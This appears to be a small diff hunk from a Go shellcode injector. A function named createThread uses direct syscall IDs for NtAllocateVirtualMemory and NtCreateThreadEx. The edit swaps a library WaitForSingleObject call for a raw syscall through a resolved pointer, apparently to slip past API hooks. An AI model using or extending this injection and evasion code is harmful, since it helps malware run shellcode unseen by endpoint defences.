@@ -202,6 +202,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		return
 	}
 	NtCreateThreadExSysid.Recover()
-	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
 
 }
